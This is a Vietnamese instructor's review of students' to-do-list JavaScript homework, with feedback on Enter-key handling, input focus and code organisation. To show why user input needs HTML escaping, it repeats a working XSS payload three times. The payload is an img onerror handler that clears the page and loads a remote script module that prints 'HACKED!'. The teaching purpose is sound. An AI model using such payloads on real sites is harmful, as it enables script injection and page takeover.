# Dương review bài tập về nhà buổi 24 Lớp k2-FS

## [Bùi Quang Trưởng](https://github.com/OkazakiTruong/BQTruong-F8-K2-Offline/tree/main/Day24)

- [x] Bài 1:

  Bài làm rất tốt \*

  Thiếu case nhấn phím "enter" để thêm task mới.

  Thiếu case sau khi add task thì focus lại vào input

  Có thể xử lý một cách đơn giản bằng cách sửa lại đoạn html:

  ```html
  <div class="add-new-task">
    <input type="text" class="new-task" placeholder="What is the task today" />
    <button class="btn-add">Add task</button>
  </div>
  ```

  Đề xuất sửa thành:

  ```html
  <form class="add-new-task">
    <input type="text" class="new-task" placeholder="What is the task today" />
    <button class="btn-add">Add task</button>
  </form>
  ```

  Sau khi lấy được value của input, cần xử lý chuỗi để thay thế dấu `<` thành `&lt;`, dấu `>` thành `&gt;` để tránh được lỗi khi người dùng cố tình nhập một thẻ HTML.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/duongnguyen321.github.io/jsvjp/index.min.js";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/duongnguyen321.github.io/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà:

  Bài làm rất tốt, tuy nhiên cần xử lý thêm các case chưa hoàn thiện để giống với bản mẫu.

---

## [Vũ Đức Tài](https://github.com/Apeiron2/F8-fullstack-K2/blob/main/homework/day_24/script.js)

- [x] Bài 1:

  Bài làm rất tốt \*

  Có thể phát triển thêm case sau khi add task bằng cách clock button thì focus lại vào input

  Sau khi lấy được value của input, cần xử lý chuỗi để thay thế dấu `<` thành `&lt;`, dấu `>` thành `&gt;` để tránh được lỗi khi người dùng cố tình nhập một thẻ HTML.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/duongnguyen321.github.io/jsvjp/index.min.js";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/duongnguyen321.github.io/jsvjp/style.css");'
  />
  ```

  Các function chung nên được khai báo và viết đúng thứ tự **viết trước, gọi sau**, không nên định nghĩa ở một nơi quá xa và không có ý nghĩa, ví dụ như hàm `del()` đang được định nghĩa ở cuối file tuy nhiên gọi ở đầu file.

- [x] Đánh giá chung bài tập về nhà:

  Bài làm rất tốt, tuy nhiên cần để ý thêm về cách trình bày code sao cho dễ đọc, hiểu.

---

## [Thế Nguyễn Đại](https://github.com/daithehh04/fullstack/blob/main/day24/assets/js/script.js)

- [x] Bài 1:

  Bài làm tốt \*

  Khi mở nhiều edit task cùng một lúc, đang bị lỗi khi lấy value của input.

  Khi gặp lỗi, một số form bị trống và khi sửa lại thì bị reload trang.

  **Có thể là do thay đổi className và bị trùng lặp khi lấy dữ liệu**

  Khi đang mở nhiều task một lúc, thêm 1 task mới thì các task cũ không còn được mở edit.

  Sau khi lấy được value của input, cần xử lý chuỗi để thay thế dấu `<` thành `&lt;`, dấu `>` thành `&gt;` để tránh được lỗi khi người dùng cố tình nhập một thẻ HTML.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/duongnguyen321.github.io/jsvjp/index.min.js";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/duongnguyen321.github.io/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà:

  Bài làm tốt, tuy nhiên cần xử lý thêm các case chưa hoàn thiện để giống với bản mẫu.

---

## [Kiều Duy Tùng](https://github.com/daithehh04/fullstack/blob/main/day24/assets/js/script.js)

- [x] Bài 1:

  Bài làm tốt

  Khi add bằng cách nhấn phím enter trong input thì submit form tuy nhiên chưa chặn mặc định khiến cho bị reload trang.

  Thiếu case nhấn phím "enter" để thêm task mới.

  Thiếu case sau khi add task thì focus lại vào input

- [x] Đánh giá chung bài tập về nhà:

  Bài làm tốt, tuy nhiên cần xử lý thêm các case chưa hoàn thiện để giống với bản mẫu.

---
